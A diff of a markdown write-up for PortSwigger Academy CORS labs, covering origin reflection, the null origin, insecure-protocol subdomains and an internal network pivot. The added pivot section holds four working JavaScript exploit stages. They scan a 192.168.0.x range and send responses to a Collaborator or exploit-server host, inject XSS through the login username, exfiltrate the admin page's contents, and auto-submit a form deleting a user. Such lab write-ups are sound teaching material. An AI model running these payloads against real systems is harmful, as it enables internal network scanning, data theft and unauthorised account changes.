@@ -1,14 +1,12 @@
 # Cross-origin resource sharing (CORS)
 
-## Basics
+## CORS vulnerability with basic origin reflection
 
-### CORS vulnerability with basic origin reflection
+### Description
 
-#### Description
+The Academy website for [this lab](https://portswigger.net/web-security/cors/lab-basic-origin-reflection-attack) has an insecure CORS configuration in that it trusts all origins. 
 
-The Academy website for this lab has an insecure CORS configuration in that it trusts all origins. 
-
-#### Proof of Concept
+### Proof of Concept
 
 1. Start Burp, foxyproxy, and with intercept off, log in to the target site and access your account page.
 
@@ -58,27 +56,27 @@ The origin is reflected in the `Access-Control-Allow-Origin` header, meaning the
 
 9. Copy the administrator's API key, and enter it as solution to the lab.
 
-#### Exploitability
+### Exploitability
 
 To exploit this vulnerability, an attacker would have to create an exploit from a well-know template. Then, the attacker would need to convince the administrator into visiting the page with the exploit, potentially giving the attacker access to the administrator's account and all associated privileges and resources.
 
-#### Impact
+### Impact
 
 The attacker could disable account notifications, enable 2FA to lock them out, and transfer their data to an arbitrary address.
 
-#### Remediation
+### Remediation
 
 An attacker can directly forge a request from any trusted origin. Apply protections to sensitive data, such as authentication and session management, in addition to configuring CORS.
 
 ----
 
-### CORS vulnerability with trusted null origin
+## CORS vulnerability with trusted null origin
 
-#### Description
+### Description
 
-This website has an insecure CORS configuration in that it trusts the `null` origin. To solve the lab, craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to your exploit server. The lab is solved when you successfully submit the administrator's API key. You can log in to your own account using the following credentials: `wiener:peter` 
+[This website](https://portswigger.net/web-security/cors/lab-null-origin-whitelisted-attack) has an insecure CORS configuration in that it trusts the `null` origin.  
 
-#### Proof of Concept
+### Proof of Concept
 
 1. Start Burp, foxyproxy, and with intercept off, log in to the target site and access your account page.
 2. In Burp, review the **HTTPhistory**. The API key is retrieved via an AJAX request to `/accountDetails`, and the response contains the `Access-Control-Allow-Credentials` header suggesting that it may support CORS.
@@ -104,17 +102,19 @@ This website has an insecure CORS configuration in that it trusts the `null` ori
 8. Go to **Access log**
 9. Copy the administrator's API key, and enter it as solution to the lab.
 
-## Practitioner
+### Exploitability
 
-### CORS vulnerability with trusted insecure protocols
+To solve the lab, an attacker needs to craft some JavaScript that uses CORS to retrieve the administrator's API key and upload the code to the exploit server. The lab is solved when the attacker successfully submits the administrator's API key. An account with credentials `wiener:peter` is available.
 
-#### Description
+----
 
-The website of this lab has an insecure CORS configuration in that it trusts all subdomains regardless of the protocol. 
+## CORS vulnerability with trusted insecure protocols
 
-_If an on-path attack (MitM) between server and victim was possible, a connection to an insecure subdomain could be hijacked, and malicious JavaScript injected to exploit the CORS configuration. Unfortunately, in this lab environment on-path is not possible, so we use an alternative way of injecting JavaScript into the subdomain._
+### Description
 
-#### Proof of Concept
+The website of [this lab](https://portswigger.net/web-security/cors/lab-breaking-https-attack) has an insecure CORS configuration in that it trusts all subdomains regardless of the protocol.
+
+### Proof of Concept
 
 1. Start Burp, foxyproxy, and with intercept off, log in to the target site and access your account page.
 2. In Burp, review the history. The API key is retrieved via an AJAX request to `/accountDetails`, and the response contains the `Access-Control-Allow-Credentials` header suggesting that it may support CORS.
@@ -134,13 +134,119 @@ _If an on-path attack (MitM) between server and victim was possible, a connectio
 9. Go to **Access log**
 10. Copy the administrator's API key, and enter it as solution to the lab.
 
-## Expert
+### Exploitability
 
-### CORS vulnerability with internal network pivot attack
+_If an on-path attack (MitM) between server and victim was possible, a connection to an insecure subdomain could be hijacked, and malicious JavaScript injected to exploit the CORS configuration. Unfortunately, in this lab environment on-path is not possible, so we used an alternative way of injecting JavaScript into the subdomain._
 
-#### Description
+----
 
-The website of this lab has an insecure CORS configuration in that it trusts all internal network origins, and requires multiple steps to complete. 
+## CORS vulnerability with internal network pivot attack
+
+### Description
+
+The website of [this lab](https://portswigger.net/web-security/cors/lab-internal-network-pivot-attack) has an insecure CORS configuration in that it trusts all internal network origins, and requires multiple steps to complete. 
+
+### Proof of Concept
+
+1. Scan the local network for the endpoint. Replace `$collaboratorPayload` with your own Collaborator payload or exploit server URL. Enter the following code into the exploit server. Click **Store**, then **Deliver exploit to victim**. Inspect the log or the Collaborator interaction and look at the code parameter sent to it.
+
+```html
+<script>
+var q = [], collaboratorURL = 'http://$collaboratorPayload';
+
+for(i=1;i<=255;i++) {
+	q.push(function(url) {
+		return function(wait) {
+			fetchUrl(url, wait);
+		}
+	}('http://192.168.0.'+i+':8080'));
+}
+
+for(i=1;i<=20;i++){
+	if(q.length)q.shift()(i*100);
+}
+
+function fetchUrl(url, wait) {
+	var controller = new AbortController(), signal = controller.signal;
+	fetch(url, {signal}).then(r => r.text().then(text => {
+		location = collaboratorURL + '?ip='+url.replace(/^http:\/\//,'')+'&code='+encodeURIComponent(text)+'&'+Date.now();
+	}))
+	.catch(e => {
+		if(q.length) {
+			q.shift()(wait);
+		}
+	});
+	setTimeout(x => {
+		controller.abort();
+		if(q.length) {
+			q.shift()(wait);
+		}
+	}, wait);
+}
+</script>
+```
+
+2. Clear the code from stage 1 and enter the following code in the exploit server. Replace `$ip` with the IP address and port number retrieved from your collaborator interaction. Don't forget to add your Collaborator payload or exploit server URL again. Update and deliver your exploit. We will now probe the username field for an XSS vulnerability. You should retrieve a Collaborator interaction with `foundXSS=1` in the URL or you will see `foundXSS=1` in the log.
+
+```html
+<script>
+function xss(url, text, vector) {
+	location = url + '/login?time='+Date.now()+'&username='+encodeURIComponent(vector)+'&password=test&csrf='+text.match(/csrf" value="([^"]+)"/)[1];
+}
+
+function fetchUrl(url, collaboratorURL){
+	fetch(url).then(r => r.text().then(text => {
+		xss(url, text, '"><img src='+collaboratorURL+'?foundXSS=1>');
+	}))
+}
+
+fetchUrl("http://$ip", "http://$collaboratorPayload");
+</script>
+```
+
+3. Clear the code from stage 2 and enter the following code in the exploit server. Replace `$ip` with the same IP address and port number as in step 2 and don't forget to add your Collaborator payload or exploit server again. Update and deliver your exploit. Your Collaborator interaction or your exploit server log should now give you the source code of the admin page.
+
+```html
+<script>
+function xss(url, text, vector) {
+	location = url + '/login?time='+Date.now()+'&username='+encodeURIComponent(vector)+'&password=test&csrf='+text.match(/csrf" value="([^"]+)"/)[1];
+}
+
+function fetchUrl(url, collaboratorURL){
+	fetch(url).then(r=>r.text().then(text=>
+	{
+		xss(url, text, '"><iframe src=/admin onload="new Image().src=\''+collaboratorURL+'?code=\'+encodeURIComponent(this.contentWindow.document.body.innerHTML)">');
+	}
+	))
+}
+
+fetchUrl("http://$ip", "http://$collaboratorPayload");
+</script>
+```
+
+4. Read the source code retrieved from step 3 in your Collaborator interaction or on the exploit server log. You'll notice there's a form that allows you to delete a user. Clear the code from stage 3 and enter the following code in the exploit server. Replace `$ip` with the same IP address and port number as in steps 2 and 3. The code submits the form to delete carlos by injecting an `iframe` pointing to the `/admin` page.
+
+```html
+<script>
+function xss(url, text, vector) {
+	location = url + '/login?time='+Date.now()+'&username='+encodeURIComponent(vector)+'&password=test&csrf='+text.match(/csrf" value="([^"]+)"/)[1];
+}
+
+function fetchUrl(url){
+	fetch(url).then(r=>r.text().then(text=>
+	{
+	xss(url, text, '"><iframe src=/admin onload="var f=this.contentWindow.document.forms[0];if(f.username)f.username.value=\'carlos\',f.submit()">');
+	}
+	))
+}
+
+fetchUrl("http://$ip");
+</script>
+```
+
+Click on **Deliver exploit to victim** to submit the code. Once you have submitted the form to delete user carlos then you have completed the lab.
+
+### Exploitability
 
 _Note: To prevent the Academy platform being used to attack third parties, the firewall blocks interactions between the labs and arbitrary external systems. The provided exploit server and/or Burp Collaborator's default public server must be used._
 
